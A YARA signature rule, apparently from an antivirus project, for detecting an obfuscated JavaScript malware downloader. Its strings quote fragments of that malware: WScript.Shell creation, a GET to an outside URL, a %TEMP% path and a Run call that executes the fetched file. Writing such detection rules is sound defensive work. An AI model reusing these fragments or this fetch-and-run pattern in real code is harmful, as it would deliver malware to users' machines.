rule sig_20160427_4c69c57e38846cef36e785a59fa1115b {
  meta:
    description = "datamaliciousorder - file 20160427_4c69c57e38846cef36e785a59fa1115b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f5a56df3bf05e33c1c1f7a5a133d623080c9d2317deb4d09569a4e3b416ce368"

  strings:
    $s1  = "function WfatrQdens() {return YymzwHtrkv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"t0ZFUeS" ascii
    $s2  = "function WfatrQdens() {return YymzwHtrkv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"t0ZFUeS" ascii
    $s3  = "var YymzwHtrkv = function RfwrqSaukw() {return TpieiMeakx[RnifwVpdad](\"WScript\"+\".Shell\");}(), JttijZdamv = 11;" fullword ascii
    $s4  = "function GzgkqTfpbj(EvbngQigmd, CyadbDaffz){VjyarVammb = VjyarVammb * 1; return EvbngQigmd - CyadbDaffz;};" fullword ascii
    $s5  = "var TpieiMeakx = this[\"WScript\"];" fullword ascii
    $s6  = "function LbdqzLozsx(){return HmhkaGabrg + \"\";};" fullword ascii
    $s7  = "function IojabQtodf() {return ((HcwcvDqfoy == true) && (HcwcvDqfoy == ClxxrNrowk)) ? 1 : VjyarVammb;};" fullword ascii
    $s8  = "OwbvxWocrl[NeohbFscgd](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s9  = "XtgzcCmocc = true;" fullword ascii
    $s10 = "}while (DsqhaLracy);" fullword ascii
    $s11 = "function UsaxwPcroc()" fullword ascii
    $s12 = "ClxxrNrowk = true; " fullword ascii
    $s13 = "var ClxxrNrowk = false;" fullword ascii
    $s14 = "var XtgzcCmocc = false;" fullword ascii
    $s15 = "if (OwbvxWocrl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s16 = "HcwcvDqfoy = true; " fullword ascii
    $s17 = "function KxpwrUmsty(BxeseVskdm) {var TjvfvDimln = (1, 2, 3, 4, 5, BxeseVskdm); return TjvfvDimln;};" fullword ascii
    $s18 = "var HcwcvDqfoy = false;" fullword ascii
    $s19 = "return GzgkqTfpbj(HeobrUzohf, BnxhpMclaz);" fullword ascii
    $s20 = "function MtaseTjvrx(VlvuhCcgnd){YymzwHtrkv[\"R\"+\"un\"](VlvuhCcgnd, VjyarVammb, VjyarVammb);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}